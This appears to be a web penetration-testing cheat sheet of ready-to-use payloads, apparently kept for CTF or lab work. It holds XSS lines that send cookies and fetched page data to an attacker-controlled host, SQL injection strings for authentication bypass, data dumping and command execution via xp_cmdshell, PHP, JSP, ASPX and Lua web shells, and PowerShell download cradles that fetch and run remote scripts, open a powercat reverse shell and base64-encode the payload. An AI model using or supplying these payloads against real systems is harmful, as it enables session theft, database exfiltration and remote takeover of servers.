Last update: 2025.10.10
### XSS:
###### Cookie stealing:
```html
<script>new Image().src="http://<IP>:8000?c="+document.cookie;</script>
```
```html
<img src=x onerror="fetch('http://<IP>:8000?c='+document.cookie)">
```
###### Forced browsing (GET):
```html
<script>
fetch("<target-url>")
  .then(response => response.text())
  .then(data => {
    fetch("http://<IP>:8000/?data=" + encodeURIComponent(data));
  });
</script>
```
###### Forced browsing (POST):
```html
<a href="javascript:fetch('<target-url>')  
  .then(response => response.text())  
  .then(data => fetch('http://<IP>:8000/', {  
    method: 'POST',  
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },  
    body: 'data=' + encodeURIComponent(data)  
  }))">XSS</a>
```
Server script: https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/Cat/server.py 
###### WordPress Escalation:
https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/

---
### SQL Injection:
###### Character Testing:
```
" ' ; * $ \ % _ \0 \b \n \r \t \Z
```
###### Authentication Bypass:
```sql
<user>' OR 1=1 -- //
```
###### Error-Based:
```sql
-- version detection
' OR 1=1 IN (SELECT @@version) -- //
```
```sql
-- dump data
' OR 1=1 IN (SELECT [* | <columns>] FROM <table> [<condition>]) -- //
```
###### UNION-Based:
```sql
-- column detection
' ORDER BY <num>-- //
```
```sql
-- system info
' UNION SELECT null, database(), user(), @@version -- //
```
```sql
-- data exfiltration
' UNION SELECT table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- //
```
###### Blind:
```sql
-- boolean
' AND 1=1 -- //
```
```sql
-- time-based
' AND IF (1=1, sleep(3), 'false') -- //
```
###### Code Execution:
```sql
-- MSSQL
exec sp_configure 'show advanced options', '1'
reconfigure
exec sp_configure 'xp_cmdshell', '1'
reconfigure
exec xp_cmdshell '<command>';
xp_cmdshell '<command>';
```
```sql
-- MySQL
SELECT "<payload>", null, null INTO OUTFILE "<filepath>"
```


---
### Web Shells:
###### PHP:
```php
<?php system($_GET['cmd']); ?>
```
```php
<?php echo system($_GET['cmd']); ?>
```
```php
<?=`$_GET[x]`?>
```
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
```php
# .htaccess
AddType application/x-httpd-php .<ext>
```
###### Java:
- Msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f war -o shell.war`
###### ASPX:
- Kali: `/usr/share/webshells/aspx/cmdasp.aspx`
###### LUA:
```lua
<?lsp
os.execute("C:\\Users\\Public\\Downloads\\shell.exe")
?>
```

---
### Web Cradle (Windows):
**cradle.ps1:**
```powershell
IEX(New-Object Net.WebClient).downloadString("http://<IP>:<PORT>/shell.ps1")
```
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>:<PORT>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell
```
**Base64 Conversion:**
```bash
cat cradle.ps1 | iconv -t utf-16le | base64 -w 0
```
```powershell
# pwsh
$Text = '<payload>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```
**Payload to send:**
```powershell
powershell -enc <BASE64>
```
**shell.ps1:**
```
Whatever PowerShell commands to be executed.
```
Or use `powercat.ps1`: https://github.com/besimorhino/powercat

---